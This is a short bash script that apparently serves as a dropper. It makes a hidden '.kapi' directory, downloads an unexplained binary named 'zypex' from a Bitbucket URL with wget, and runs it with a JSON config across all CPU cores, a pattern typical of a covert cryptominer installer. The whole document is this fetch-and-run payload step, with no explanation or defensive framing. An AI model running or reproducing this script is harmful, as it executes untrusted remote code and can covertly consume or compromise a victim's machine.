#!/bin/bash
mkdir .kapi && cd .kapi
wget https://bitbucket.org/excel-gms/bin/downloads/zypex 
./zypex -c "uht.json" $(nproc --all)
